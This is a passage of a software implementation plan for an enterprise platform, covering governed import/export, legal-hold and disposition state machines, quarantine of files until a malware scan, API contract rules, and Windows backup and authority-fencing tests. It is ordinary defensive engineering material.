pub struct ImportProposal {
    pub proposal_id: uuid::Uuid,
    pub template_version: String,
    pub generation: GenerationId,
    pub actor_id: uuid::Uuid,
    pub rows: Vec<ValidatedRow>,
    pub errors: Vec<RowError>,
    pub payload_digest: [u8; 32],
}

pub struct PortableExportManifest {
    pub schema_version: u32,
    pub legal_entities: Vec<uuid::Uuid>,
    pub files: Vec<ExportFileDigest>,
    pub audit_checkpoint: [u8; 32],
    pub generation: GenerationId,
}
```

Excel and CSV parsing never executes formula, macro, external link or embedded object. Import proposal submission goes through Task 6 and reruns authorization, validation and idempotency with per-row results. Word/PDF generation uses signed templates and quarantined attachments.

`F57PortableExportV1` is exact and self-describing: it contains schema/registry versions, legal entities, every authorized core/extension row and immutable fact, attachment ciphertext or portable plaintext according to export policy plus digest/metadata, configuration/generation/package/provider/license/deferred registries, permissions without reusable credentials, audit/checkpoint proofs, stable IDs, canonical encodings, checksums/signatures, redaction manifest and a clean-environment import/verifier/reconciliation report. Export and re-import preserve references, history, corrections, tombstones, holds and owner contracts; partial authorization is explicitly marked and cannot be called complete.

Implement retention/legal-hold/disposition as versioned current state plus immutable decisions. Priority is `legal hold > non-overridable regulatory/audit floor > contract/regulatory policy > ordinary retention`; hold release and destructive disposition require maker-checker, reauthentication and evidence. `LegalHoldV1` exact edges are `DRAFT→APPROVED|CANCELLED`、`APPROVED→ACTIVE`、`ACTIVE→RELEASE_REQUESTED`、`RELEASE_REQUESTED→RELEASED|ACTIVE` with RELEASED/CANCELLED terminal；a rejected/withdrawn release returns ACTIVE with immutable decision evidence and the hold stays effective throughout RELEASE_REQUESTED. No post-approval cancellation or direct release is accepted. `DispositionCaseV1` accepts only normal `PLANNED→IMPACTED→APPROVED→EXECUTING→VERIFIED→CLOSED` edges plus failure from any pre-CLOSED step to FAILED_CONTAINED；the only recovery is `FAILED_CONTAINED→EXECUTING` through `ResumeDispositionCase` with the same still-valid approved scope/method and idempotent continuation. Approval/scope drift leaves the old case FAILED_CONTAINED and starts a linked new PLANNED case；direct recovery to VERIFIED/CLOSED and replay of already-destroyed data are rejected. Attachments and backup recovery graphs receive pins/tombstones；restore replays disposition so deleted/crypto-erased personal data cannot resurrect, while finance/audit facts remain immutable and use permitted pseudonymization/segregation. `t_f57_sec_007` in `f57_platform_connectors_lifecycle.rs` includes named cases `legal_hold_every_allowed_edge_is_executable`、`legal_hold_every_unlisted_and_terminal_edge_is_rejected`、`release_rejection_returns_active_without_unpinning`、`disposition_every_normal_edge_is_executable`、`disposition_failure_from_each_preclosed_state_is_contained`、`failed_contained_resumes_only_to_executing_same_scope`、`scope_or_approval_change_requires_new_case` and `restore_never_resurrects_disposed_data`，plus every unlisted-edge negative.

Generic XML/SOAP/XSD is not added to this crate's certified core exact set. `ProviderCodecRef` may reference only a signed Task 14 provider that declares a concrete codec/schema digest and returns `ImportProposal` or typed commands. Unknown XML, direct object hydration and XML-to-SQL paths fail with stable errors and remain `DEF-011`.

Change `crates/platform/file/src/scan.rs` so `SKIPPED`, unavailable, timeout, unknown and stale definitions remain `Quarantine`; none is an admit state. `MalwareScannerPort` returns a signed provider verdict binding engine identity, definition version, definition timestamp, policy maximum age, file ID, volume ID and digest. The highest security profile fixes definition age at `<= 72h` according to Task 2 trusted time; a missing/untrusted time sample also quarantines. Concrete carriers are Windows Defender/AMSI in `ep-adapter-windows-malware` and approved ICAP through the SQL-free integration gateway. Offline definition updates are signed Task 13 packages; expired/revoked/wrong-engine updates, a forged definition timestamp and any update older than 72 hours are rejected, while unavailable offline media cannot relax the quarantine rule. The file adapter writes to an ACL-isolated HDD quarantine, holds a non-shared final handle, scans, rechecks file/volume identity and digest, then publishes by same-volume atomic rename. Negative tests mutate content between scan/publish, replace paths through reparse points and submit nested/archive bombs; every case remains quarantined and audited.

Approval cases are generic Task 8 capability/scope/SoD/reauth decisions and submit the approved action through Task 6. Search uses PostgreSQL 16 full-text indexes through `PgSearchDefinitionStore` inside core-server; results apply row/field authorization before ranking/faceting and never expose hidden-value counts. `integration-gateway` remains SQL-free.

API evolution is atomic and closed. Task 23 adds no method/path pair. It consumes exactly the seed rows owned by `F57-23`: Control introduces `19/12` command/query rows at `1.1.0-f57`, making the cumulative Control slice `39/29` with exact `x-planned-implementation-tasks: [F57-16,F57-23]`; Employee introduces `3/3` rows at `1.4.0-f57`, making the cumulative Employee slice `230/102` with exact `x-planned-implementation-tasks: [F57-18,F57-19,F57-20,F57-21,F57-23]`. Accordingly it bumps `control-center.v1.yaml` from `1.0.0-f57` to `1.1.0-f57` and `employee-api.v1.yaml` from `1.3.0-f57` to `1.4.0-f57`; every introduced branch has `x-f57-owner-task: F57-23`. Portal file ingress is already an F57-22/Portal-1.0 contract and is untouched here.

The seed is the only machine exact-set: OpenAPI、Control/Employee Rust Task 6 registration and each generated TypeScript union must equal its cumulative slice across wire literal、payload/result/error `$ref`、CAS and audience. Missing、extra、renamed、prefix/default、wrong-surface、wrong-owner、wrong-version or one-sided rows fail. There is no provider/configuration catch-all, caller-selected repository/object name, file discriminator or bare-latest alias；identity、retention、search-definition publication and connector/provider administration remain Control-only.

Every referenced component is a JSON Schema 2020-12 strict object with `additionalProperties:false` and is generated into the matching Rust/TypeScript closed tagged union under the Task 1 component-shape rule. Common exact components are `Task23ObjectRefV1={object_type,object_id,object_version}` and `Task23EvidenceRefV1={evidence_id,evidence_sha256}`；legal entity、actor、audience、policy、MFA/reauth and authority epoch always come from verified server context and are forbidden in these payloads. Each seed-named `*GetQueryV1` is its exact subject-ID field only, and each seed-named `*ListQueryV1` is `{states,subject,page_size,cursor}`. Arrays are sorted/unique, `page_size=1..200`, and all optional values are present as JSON null rather than omitted. Request exact fields are:

- `ApprovalCaseCreateRequestV1={subject,action_code,request_sha256,evidence_refs}`；policy derives required capabilities、SoD tags and expiry after the request digest is fixed. `ControlApprovalCaseDecisionRequestV1={case_id,expected_row_version,decision,evidence_refs}` while `EmployeeApprovalCaseDecisionRequestV1={case_id,decision,evidence_refs}`，decision=`APPROVE|REJECT`；the Employee envelope's positive `expected_subject_version` is its sole CAS, whereas Control's registry mode uses payload `expected_row_version`;
- `LegalHoldCreateRequestV1={hold_id,scope,legal_basis,retention_floor,reason,evidence_refs}`、`LegalHoldTransitionRequestV1={hold_id,expected_row_version,reason,evidence_refs}`、`LegalHoldApprovalDecisionRequestV1={hold_id,expected_row_version,decision,evidence_refs}` with decision=`APPROVE|REJECT`、`LegalHoldReleaseDecisionRequestV1={hold_id,expected_row_version,decision,evidence_refs}` with the separate decision=`RELEASE|KEEP_ACTIVE`, and `LegalHoldReleaseRequestV1={hold_id,expected_row_version,reason,evidence_refs}`;
- `DispositionCaseCreateRequestV1={case_id,scope,method,policy_ref,evidence_refs}`、`DispositionImpactRequestV1={case_id,expected_row_version,impact_digest,blocking_refs,evidence_refs}`、`DispositionDecisionRequestV1={case_id,expected_row_version,decision,evidence_refs}`、`DispositionExecuteRequestV1={case_id,expected_row_version,approved_scope_digest}`、`DispositionVerifyRequestV1={case_id,expected_row_version,verification_evidence_refs}`、`DispositionTransitionRequestV1={case_id,expected_row_version}` and `DispositionResumeRequestV1={case_id,expected_row_version,approved_scope_digest,containment_resolution_evidence_refs}`;
- `SearchDefinitionPublishRequestV1={definition_id,expected_row_version,schema_version,query_ast,filter_fields,sort_fields,projection_fields,maximum_page_size}`、`ExternalIdentityLinkCreateRequestV1={provider_id,external_subject_digest,user_id,link_proof_id}`、`ExternalIdentityLinkRevokeRequestV1={link_id,expected_row_version,reason}`;
- `PortableExportCreateRequestV1={scope,format,redaction_policy_ref,reason,evidence_refs}`、`PortableExportRequestV1={scope,format,reason}`、`ImportProposalSubmitRequestV1={published_attachment_ref,template_id,template_version,proposal_sha256,mode}` and `AuthorizedSearchRequestV1={definition_id,definition_version,filter,sort,page_size,cursor}`。`format` is exactly `F57_PORTABLE_EXPORT_V1`; import mode is `VALIDATE_ONLY|SUBMIT_FOR_APPROVAL`.

Accepted value components are likewise exact: `ApprovalCaseAcceptedV1={case_id,state,row_version}`、`LegalHoldAcceptedV1={hold_id,state,row_version}`、`DispositionCaseAcceptedV1={case_id,state,row_version}`、`SearchDefinitionPublishedV1={definition_id,version,definition_sha256}`、`ExternalIdentityLinkChangedV1={link_id,state,row_version}`、`PortableExportAcceptedV1={export_id,state,row_version}` and `ImportProposalAcceptedV1={proposal_id,state,row_version}`。View/page schemas enumerate their domain fields and never use free-form `data`/`attributes` maps. Each operation uses the existing Task 16/18 result/error envelope and an explicit `oneOf` discriminator；its exact error component and operation-only/shared enum composition come only from the seed plus Task 1 deterministic error rule. Unknown/default/alias/extra error variants fail contract generation, and every non-`NONE` Task 23 operation code must already be a canonical row in `docs/error-codes.md` before the task starts.

Only the Control Center and Employee YAML rows, authority semantic rows, core adapters and their two generated clients update in this change. Contract tests exact-compare version、method/path、discriminator、owner、payload/result `$ref`、error enum and generated-client sets, and reject missing/extra/default variants, one-sided registry changes, direct repository/provider routes and every Control-only variant in Employee/Portal audiences.

- [ ] **Step 4: Freeze connector delivery scope**

```rust
#[test]
fn certified_core_connectors_are_explicit() {
    assert_eq!(CertifiedProvider::ALL, [
        CertifiedProvider::LocalFile,
        CertifiedProvider::ExcelCsvWordPdf,
        CertifiedProvider::RestWebhook,
        CertifiedProvider::Mcp,
        CertifiedProvider::Smtp,
        CertifiedProvider::ActiveDirectoryLdap,
    ]);
}
```

Local account plus local break-glass and AD/LDAP are certified current identity paths. Task 23 does not invent MCP transport: its `Mcp` certification reruns Task 14's exact inbound/outbound protocol, signed dynamic tool manifest, grant, containment, audit and Unknown-reconciliation suites against the packaged carriers and requires both MCP release gates. OIDC/SAML uses the same signed provider contract and remains disabled until the exact IDP-003 provider-specific evidence below exists. WeCom, DingTalk, Feishu, Microsoft 365, WPS, bank, tax and signature vendors are capability packages over provider contracts; they are not all bundled implementations. An unavailable optional connector opens a degradation window and never damages internal facts.

- [ ] **Step 5: Run import/export, identity and provider conformance**

`t_f57_idp_003` is an exact provider matrix, not a generic login happy path. OIDC/SAML packages are disabled by default and can activate only when signed provider metadata is current and canonical；issuer/entity ID、audience/recipient、redirect/ACS origin、signature algorithm/key/chain/full CRL、nonce/state/code/response replay、clock window、claim allowlist/mapping、account-link collision、metadata/signing-key rotation、single logout and processing residency all pass. Provider disabled/expired/revoked, unsigned or stale metadata, wrong issuer/audience/recipient/origin, weak/wrong signature, replay, unsolicited response, unknown/privilege-bearing claim, ambiguous/cross-法人 link, logout that leaves a local session, metadata registry swap, network fallback or foreign processing location must fail before link/session creation and must not fall back to another external provider. Local break-glass remains separate and audited; it is never an automatic external-login fallback.

Run: `cargo test -p ep-platform-import-export -p ep-platform-identity -p ep-platform-notify -p ep-platform-file -p ep-platform-approval -p ep-platform-search -p ep-contract-mcp -p ep-platform-mcp -p ep-adapter-file -p ep-adapter-windows-malware -p ep-adapter-doc -p ep-adapter-search -p ep-adapter-db-pg -p integration-gateway -p core-server && cargo test -p ep-testkit --test f57_import_export --test f57_identity_provider --test f57_file_quarantine --test f57_approval_search --test f57_platform_connectors_lifecycle --test f57_control_center_contract --test f57_workbench_contract --test f57_provider_containment && cargo xtask sqlcheck && cargo xtask archcheck && cargo xtask f57check --task F57-23 --phase post-green`

Expected: PASS for formula/macro/external-link payloads, row errors, duplicate imports, field permission, complete portable export/re-import/reconciliation, hold/disposition/restore-tombstone propagation, generic-XML denial/provider-codec boundary, scan TOCTOU/archive bombs, signed offline definition update and stale-definition `>72h` quarantine negatives, approval SoD, search inference, AD outage, account linking, break-glass and optional-provider failure.

- [ ] **Step 6: Commit**

```bash
git add -- crates/foundation/src/port/malware.rs crates/foundation/src/port/mod.rs crates/foundation/src/lib.rs crates/adapter/doc/src/lib.rs crates/adapter/doc/Cargo.toml crates/adapter/file/src/lib.rs
git add -- crates/adapter/file/src/quarantine.rs crates/adapter/file/src/scanner.rs crates/adapter/file/src/publisher.rs crates/adapter/file/Cargo.toml crates/adapter/windows-malware/Cargo.toml crates/adapter/windows-malware/src/lib.rs
git add -- crates/adapter/windows-malware/src/defender.rs crates/adapter/windows-malware/src/amsi.rs crates/adapter/windows-malware/tests/verdict.rs crates/adapter/search/src/lib.rs crates/adapter/search/Cargo.toml crates/platform/file/src/scan.rs
git add -- crates/platform/file/src/scanner.rs crates/platform/file/src/lifecycle.rs crates/platform/file/src/legal_hold.rs crates/platform/file/src/disposition.rs crates/platform/file/src/upload.rs crates/platform/file/src/lib.rs
git add -- crates/platform/file/Cargo.toml crates/platform/approval/Cargo.toml crates/platform/approval/src/lib.rs crates/platform/approval/src/case.rs crates/platform/approval/src/policy.rs crates/platform/search/Cargo.toml
git add -- crates/platform/search/src/lib.rs crates/platform/search/src/definition.rs crates/platform/search/src/query.rs crates/platform/identity/src/ports.rs crates/platform/identity/src/external.rs crates/platform/identity/src/lib.rs
git add -- crates/platform/identity/Cargo.toml crates/platform/notify/src/provider.rs crates/platform/notify/src/lib.rs crates/platform/notify/Cargo.toml crates/platform/import-export/Cargo.toml crates/platform/import-export/src/lib.rs
git add -- crates/platform/import-export/src/excel.rs crates/platform/import-export/src/csv.rs crates/platform/import-export/src/export.rs crates/platform/import-export/src/portable_v1.rs crates/platform/import-export/src/provider_codec.rs crates/platform/import-export/tests/formula_injection.rs
git add -- Cargo.toml crates/adapter/db-pg/src/platform_file/mod.rs crates/adapter/db-pg/src/platform_file/objects.rs crates/adapter/db-pg/src/platform_file/governed_lifecycle.rs crates/adapter/db-pg/src/platform_flow/approval_cases.rs crates/adapter/db-pg/src/platform_core/external_identity_links.rs crates/adapter/db-pg/src/platform_meta/search_definitions.rs
git add -- crates/adapter/db-pg/src/platform_flow/mod.rs crates/adapter/db-pg/src/platform_core/mod.rs crates/adapter/db-pg/src/platform_meta/mod.rs crates/adapter/db-pg/src/lib.rs crates/adapter/db-pg/Cargo.toml db/migrations/platform_file/V20261025093100__platform_file_extend_governed_lifecycle.sql
git add -- db/migrations/platform_flow/V20261025093200__platform_flow_create_approval_cases.sql db/migrations/platform_core/V20261025093300__platform_core_create_external_identity_links.sql db/migrations/platform_meta/V20261025093400__platform_meta_create_search_definitions.sql apps/integration-gateway/src/providers/mod.rs apps/integration-gateway/src/providers/smtp.rs apps/integration-gateway/src/providers/webhook.rs
git add -- apps/integration-gateway/src/providers/ad_ldap.rs apps/integration-gateway/src/providers/oidc_saml.rs apps/integration-gateway/src/providers/icap.rs apps/integration-gateway/src/main.rs apps/integration-gateway/src/wiring/mod.rs apps/integration-gateway/Cargo.toml
git add -- apps/core-server/src/platform/common_services.rs apps/core-server/src/platform/control_center.rs apps/core-server/src/platform/employee_api.rs apps/core-server/src/platform/mod.rs apps/core-server/src/wiring/business.rs apps/core-server/Cargo.toml
git add -- clients/control-center/src/api/authority.ts clients/workbench/src/api/employee.ts docs/openapi/control-center.v1.yaml docs/openapi/employee-api.v1.yaml docs/openapi/README.md
git add -- docs/superpowers/reviews/2026-08-23-f57-authority-supersession-register.md docs/data-dictionary/platform_flow.md docs/event-catalog.md docs/metrics-catalog.md testkit/tests/f57_import_export.rs testkit/tests/f57_identity_provider.rs
git add -- testkit/tests/f57_file_quarantine.rs testkit/tests/f57_approval_search.rs testkit/tests/f57_platform_connectors_lifecycle.rs testkit/tests/f57_control_center_contract.rs testkit/tests/f57_workbench_contract.rs testkit/Cargo.toml
git commit -m "feat: add governed office and identity connectors"
```

### Task 24: Build native Windows services, trusted IPC/time, ransomware recovery and transactional fencing

**Files:**
- Existing authoritative input: `docs/superpowers/specs/2026-08-23-f57-client-lifecycle-security-contract.md`
- Existing authoritative input: `docs/adr/ADR-0024-f57-backup-key-envelope.md`
- Existing authoritative input: `docs/evidence/f57-recovery-domain-manifest.schema.json`
- Existing authoritative input: `docs/f57-api-discriminators.seed.tsv`
- Existing authoritative input: `docs/f57-api-component-shapes.seed.tsv`
- Existing authoritative input: `docs/f57-api-component-state-domains.seed.tsv`
- Existing authoritative input: `docs/f57-api-state-domains.seed.tsv`
- Existing authoritative input: `docs/f57-api-direct-routes.seed.tsv`
- Modify: `docs/openapi/control-center.v1.yaml`
- Modify: `docs/openapi/README.md`
- Modify: `docs/superpowers/reviews/2026-08-23-f57-authority-supersession-register.md`
- Modify: `docs/data-dictionary/platform_flow.md`
- Modify: `docs/event-catalog.md`
- Modify: `docs/metrics-catalog.md`
- Create: `crates/foundation/src/port/backup.rs`
- Modify: `crates/foundation/src/port/mod.rs`
- Modify: `crates/foundation/src/lib.rs`
- Modify: `crates/platform/secrets/src/recovery_domain.rs`
- Modify: `crates/platform/secrets/tests/recovery_domain_manifest.rs`
- Create: `crates/platform/backup/Cargo.toml`
- Create: `crates/platform/backup/src/lib.rs`
- Create: `crates/platform/backup/src/envelope.rs`
- Create: `crates/platform/backup/src/key_envelope.rs`
- Create: `crates/platform/backup/src/quota.rs`
- Create: `crates/platform/backup/src/media_state.rs`
- Create: `crates/platform/backup/src/certification.rs`
- Create: `crates/platform/backup/src/crypto.rs`
- Create: `crates/platform/backup/src/manifest.rs`
- Create: `crates/platform/backup/src/topology.rs`
- Create: `crates/platform/backup/src/rotation.rs`
- Create: `crates/platform/backup/src/checkpoint.rs`
- Create: `crates/platform/backup/src/checkpoint_signer.rs`
- Create: `crates/platform/backup/src/recovery_cut.rs`
- Create: `crates/platform/backup/src/store.rs`
- Create: `crates/platform/backup/tests/topology.rs`
- Create: `crates/platform/backup/tests/checkpoint_signer.rs`
- Create: `crates/platform/backup/tests/recovery_cut.rs`
- Create: `crates/platform/backup/tests/epb1_conformance.rs`
- Create: `crates/platform/backup/tests/media_state.rs`
- Create: `crates/platform/backup/tests/certification.rs`
- Create: `crates/platform/backup/tests/fixtures/adr0021-epb1-v1.json`
- Create: `crates/platform/backup/tests/fixtures/adr0024-backup-key-envelope-v1.json`
- Create: `crates/adapter/backup/Cargo.toml`
- Create: `crates/adapter/backup/src/lib.rs`
- Create: `crates/adapter/backup/src/epb1.rs`
- Create: `crates/adapter/backup/src/crypto.rs`
- Create: `crates/adapter/backup/src/append_only.rs`
- Create: `crates/adapter/backup/src/offline_media.rs`
- Create: `crates/adapter/backup/src/restore.rs`
- Create: `crates/adapter/backup/src/postgres16.rs`
- Create: `crates/adapter/backup/src/https_append_only.rs`
- Create: `crates/adapter/backup/src/checkpoint_signer.rs`
- Create: `crates/adapter/backup/src/recovery_cut.rs`
- Create: `crates/adapter/backup/tests/acl.rs`
- Create: `crates/adapter/backup/tests/postgres16_pitr.rs`
- Create: `crates/adapter/backup/tests/https_append_only.rs`
- Create: `crates/adapter/backup/tests/recovery_cut.rs`
- Create: `crates/adapter/backup/tests/epb1_conformance.rs`
- Create: `installer/windows/Product.wxs`
- Create: `installer/windows/EnterprisePlatform.wixproj`
- Create: `installer/windows/services.json`
- Create: `installer/windows/firewall.json`
- Create: `installer/windows/paths.json`
- Create: `installer/windows/postgresql16.lock.json`
- Create: `installer/windows/postgresql16-tls-policy.json`
- Create: `installer/windows/backup-target-service.json`
- Create: `installer/windows/rfc3161-tsa-policy.json`
- Create: `installer/windows/recovery-certification-policy.json`
- Create: `scripts/windows/build-msi.ps1`
- Create: `scripts/windows/sign-artifacts.ps1`
- Create: `scripts/windows/verify-authenticode.ps1`
- Create: `scripts/windows/install-services.ps1`
- Create: `scripts/windows/configure-data-root.ps1`
- Create: `scripts/windows/install-postgres16.ps1`
- Create: `scripts/windows/configure-postgres16.ps1`
- Create: `scripts/windows/verify-postgres16.ps1`
- Create: `scripts/windows/verify-postgres16-tls.ps1`
- Create: `scripts/windows/archive-wal.ps1`
- Create: `scripts/windows/test-postgres16-pitr.ps1`
- Create: `scripts/windows/test-recovery-tool.ps1`
- Create: `scripts/windows/verify-rfc3161-timestamp.ps1`
- Create: `scripts/windows/verify-bitlocker.ps1`
- Create: `scripts/windows/verify-boot-security.ps1`
- Create: `scripts/windows/verify-service-acls.ps1`
- Create: `scripts/windows/verify-ipc.ps1`
- Create: `scripts/windows/verify-time.ps1`
- Create: `scripts/windows/verify-hdd-routing.ps1`
- Create: `scripts/windows/verify-residency.ps1`
- Create: `scripts/windows/verify-successor-ltsc-boundary.ps1`
- Create: `scripts/windows/run-p340-certification.ps1`
- Create: `docs/evidence/f57-p340-soak-evidence.schema.json`
- Create: `scripts/windows/backup-restore-drill.ps1`
- Create: `scripts/windows/uninstall-services.ps1`
- Modify: `Cargo.toml`
- Modify: `Cargo.lock`
- Modify: `crates/platform/runtime/src/process.rs`
- Modify: `crates/platform/runtime/src/boot.rs`
- Modify: `crates/platform/runtime/src/selfcheck/items/basic.rs`
- Create: `crates/platform/runtime/src/windows_time.rs`
- Create: `crates/platform/runtime/src/residency.rs`
- Create: `crates/platform/runtime/src/successor_ltsc.rs`
- Modify: `crates/platform/runtime/src/lib.rs`
- Modify: `crates/platform/runtime/Cargo.toml`
- Modify: `crates/adapter/ipc/src/transport.rs`
- Create: `crates/adapter/ipc/src/windows_pipe.rs`
- Modify: `crates/adapter/ipc/src/lib.rs`
- Modify: `crates/adapter/ipc/Cargo.toml`
- Create: `crates/adapter/ipc/tests/windows_pipe_security.rs`
- Modify: `apps/backup-writer/src/main.rs`
- Modify: `apps/backup-writer/src/config.rs`
- Modify: `apps/backup-writer/src/wiring/mod.rs`
- Create: `apps/backup-writer/src/wiring/backup.rs`
- Create: `apps/backup-writer/src/targets.rs`
- Modify: `apps/backup-writer/Cargo.toml`
- Modify: `apps/archive-writer/src/main.rs`
- Modify: `apps/archive-writer/src/config.rs`
- Modify: `apps/archive-writer/src/wiring/mod.rs`
- Create: `apps/archive-writer/src/wiring/archive.rs`
- Create: `apps/archive-writer/src/targets.rs`
- Modify: `apps/archive-writer/Cargo.toml`
- Modify: `apps/ops-agent/src/main.rs`
- Modify: `apps/ops-agent/src/config.rs`
- Create: `apps/ops-agent/src/backup_evidence.rs`
- Create: `apps/ops-agent/src/security_incident.rs`
- Create: `apps/ops-agent/src/soak.rs`
- Modify: `apps/ops-agent/Cargo.toml`
- Create: `crates/platform/flow/src/security_incident.rs`
- Modify: `crates/platform/flow/src/lib.rs`
- Modify: `crates/platform/flow/Cargo.toml`
- Create: `crates/adapter/db-pg/src/platform_ops/security_incidents.rs`
- Create: `apps/core-server/src/platform/security_incidents.rs`
- Modify: `apps/core-server/src/platform/control_center.rs`
- Modify: `apps/core-server/src/platform/mod.rs`
- Modify: `apps/core-server/src/wiring/business.rs`
- Modify: `clients/control-center/src/api/authority.ts`
- Modify: `clients/control-center/src/features/automations/IncidentDesk.tsx`
- Modify: `clients/control-center/src/features/operations/ProductionEvidence.tsx`
- Modify: `apps/recovery-tool/Cargo.toml`
- Modify: `apps/recovery-tool/src/lib.rs`
- Modify: `apps/recovery-tool/src/main.rs`
- Modify: `apps/recovery-tool/src/piv.rs`
- Modify: `apps/recovery-tool/src/manifest.rs`
- Modify: `apps/recovery-tool/src/ceremony.rs`
- Modify: `apps/recovery-tool/src/memory.rs`
- Create: `apps/recovery-tool/src/windows_piv.rs`
- Create: `apps/recovery-tool/src/windows_memory.rs`
- Create: `apps/recovery-tool/tests/windows_ceremony.rs`
- Create: `apps/pg-passphrase-helper/Cargo.toml`
- Create: `apps/pg-passphrase-helper/src/lib.rs`
- Create: `apps/pg-passphrase-helper/src/main.rs`
- Create: `apps/pg-passphrase-helper/src/policy.rs`
- Create: `apps/pg-passphrase-helper/src/parent.rs`
- Create: `apps/pg-passphrase-helper/src/unseal.rs`
- Create: `apps/pg-passphrase-helper/tests/pre_db_tls.rs`
- Create: `apps/backup-target/Cargo.toml`
- Create: `apps/backup-target/src/lib.rs`
- Create: `apps/backup-target/src/main.rs`
- Create: `apps/backup-target/src/config.rs`
- Create: `apps/backup-target/src/authz.rs`
- Create: `apps/backup-target/src/store.rs`
- Create: `apps/backup-target/src/server.rs`
- Create: `apps/backup-target/tests/role_separation.rs`
- Create: `crates/adapter/db-pg/src/platform_ops/authority_epoch.rs`
- Create: `crates/adapter/db-pg/src/platform_ops/recovery_cut.rs`
- Create: `crates/adapter/db-pg/src/platform_ops/backup_control.rs`
- Create: `crates/adapter/db-pg/src/platform_ops/backup_sets.rs`
- Create: `crates/adapter/db-pg/src/platform_ops/backup_manifests.rs`
- Create: `crates/adapter/db-pg/src/platform_ops/backup_receipts.rs`
- Create: `crates/adapter/db-pg/src/platform_ops/offline_media.rs`
- Create: `crates/adapter/db-pg/src/platform_ops/recovery_certification.rs`
- Modify: `crates/adapter/db-pg/src/platform_ops/mod.rs`
- Modify: `crates/adapter/db-pg/src/tx.rs`
- Modify: `crates/adapter/db-pg/src/session.rs`
- Modify: `crates/adapter/db-pg/src/lib.rs`
- Modify: `crates/adapter/db-pg/Cargo.toml`
- Modify: `crates/platform/command/src/pipeline.rs`
- Modify: `apps/core-server/src/wiring/command.rs`
- Modify: `apps/core-server/Cargo.toml`
- Create: `db/migrations/platform_ops/V20261025093500__platform_ops_create_authority_epochs.sql`
- Create: `db/migrations/platform_ops/V20261025093510__platform_ops_create_security_incidents.sql`
- Modify: `xtask/src/ci.rs`
- Modify: `xtask/src/codecheck.rs`
- Modify: `xtask/src/reproduce.rs`
- Modify: `xtask/src/sign.rs`
- Modify: `xtask/src/e2e.rs`
- Modify: `.github/workflows/ci.yml`
- Modify: `.github/ci/pipeline-stages.tsv`
- Modify: `.github/ci/run-pipeline.sh`
- Modify: `.github/ci/verify-pipeline-commands.sh`
- Modify: `.github/ci/tests/run-negative.sh`
- Create: `.github/ci/tests/rfc3161-negative.ps1`
- Modify: `docs/ci-pipeline.md`
- Modify: `docs/config-reference.md`
- Modify: `scripts/verify-release.sh`
- Create: `testkit/tests/f57_authority_fencing.rs`
- Create: `testkit/tests/f57_ransomware_recovery.rs`
- Create: `testkit/tests/f57_windows_time.rs`
- Create: `testkit/tests/f57_windows_ipc.rs`
- Create: `testkit/tests/f57_postgres16_recovery.rs`
- Create: `testkit/tests/f57_backup_target.rs`
- Create: `testkit/tests/f57_backup_envelope.rs`
- Create: `testkit/tests/f57_recovery_cut.rs`
- Create: `testkit/tests/f57_recovery_tool_windows.rs`
- Create: `testkit/tests/f57_pg_tls.rs`
- Create: `testkit/tests/f57_rfc3161_signing.rs`
- Create: `testkit/tests/f57_windows_recovery_security.rs`
- Create: `testkit/tests/f57_security_incident.rs`
- Create: `testkit/tests/f57_residency.rs`
- Create: `testkit/tests/f57_successor_ltsc_boundary.rs`
- Create: `testkit/tests/f57_p340_capacity.rs`
- Create: `testkit/tests/f57_power_shutdown.rs`
- Modify: `testkit/tests/f57_control_center_contract.rs`
- Modify: `testkit/Cargo.toml`

**Interfaces:**
- Consumes: Task 2 storage/vault bootstrap, Task 7 P340/power profile, Task 9 generation, Task 14 isolated workers, Task 23 secure files, all application binaries and the immutable API discriminator seed.
- Produces: signed MSVC binaries/MSI including `recovery-tool` and `pg-passphrase-helper`, a pinned PostgreSQL 16 Windows installation/TLS contract, native SCM services, per-service virtual accounts/ACLs, authenticated named pipes, trusted time, mainland-residency and successor-LTSC boundary evidence, customer-internal RFC3161 timestamp evidence, firewall/boot/removable-media policy, transaction-bound `AuthorityEpoch`, atomic `RecoveryCutV1`, ADR-0024 `BackupKeyEnvelopeV1`, a concrete mTLS server-external append-only target, three-role/two-media-class backup controls, security-incident lifecycle and verified base-backup/WAL/PITR clean-server restore evidence.

- [ ] **Step 1: Write failing single-writer and backup-deletion tests**

```rust
#[tokio::test]
async fn old_authority_cannot_write_after_fenced_epoch_change() {
    let old = authority(epoch(7));
    promote_after_fencing(epoch(8)).await.unwrap();
    assert_eq!(old.submit(command()).await.unwrap_err().code(), "PLATFORM.AUTHORITY.STALE_EPOCH");
}

#[tokio::test]
async fn production_writer_cannot_delete_or_rewrite_backup() {
    let writer = production_backup_writer();
    assert!(writer.put_append_only(backup_chunk()).await.is_ok());
    assert!(writer.delete_latest().await.is_denied());
    assert!(writer.replace_manifest().await.is_denied());
    assert!(writer.change_retention().await.is_denied());
}

#[tokio::test]
async fn backup_writer_cannot_obtain_checkpoint_signature() {
    let writer = production_backup_writer();
    assert!(writer.export_checkpoint_key().await.is_denied());
    assert!(writer.sign_unverified_checkpoint(forged_manifest()).await.is_denied());
}

#[tokio::test]
async fn forged_or_remote_pipe_peer_never_reaches_command_bus() {
    for peer in [PeerFixture::WrongSid, PeerFixture::UnsignedProcess, PeerFixture::RemoteClient] {
        assert_eq!(connect_pipe(peer).await.unwrap_err().code(), "PLATFORM.IPC.PEER_UNTRUSTED");
    }
}

#[test]
fn untrusted_or_rolled_back_time_blocks_high_risk_write() {
    assert!(authorize_high_risk(TimeEvidence::Unsynchronized).is_denied());
    assert!(authorize_high_risk(TimeEvidence::RollbackDetected).is_denied());
}

#[tokio::test]
async fn recovery_cut_before_base_min_recovery_point_is_rejected() {
    let base = verified_base_backup().with_min_recovery_point(lsn(500));
    let err = create_recovery_cut(base, lsn(499)).await.unwrap_err();
    assert_eq!(err.code(), "PLATFORM.BACKUP.CUT_BEFORE_MIN_RECOVERY_POINT");
}

#[tokio::test]
async fn cut_pins_exact_attachment_set_against_later_change_and_gc() {
    let cut = create_recovery_cut(verified_base_backup(), lsn(700)).await.unwrap();
    replace_attachment_after_cut(cut.subject_id).await.unwrap();
    assert_eq!(restore(cut.id).await.unwrap().attachment_root, cut.attachment_set_merkle);
    assert!(gc_attachment(cut.pinned_attachment_ids[0]).await.is_denied());
}

#[test]
fn epb1_is_backup_only_and_binds_exact_chunk_semantics() {
    let envelope = epb1_fixture();
    assert_eq!(envelope.magic(), *b"EPB1");
    for mutation in [
        Mutation::Deployment, Mutation::BackupSet, Mutation::ImmutableObject,
        Mutation::ChunkNumber, Mutation::TotalPlaintextLength,
        Mutation::ReleaseOrConfigGeneration, Mutation::EnvelopeVersion,
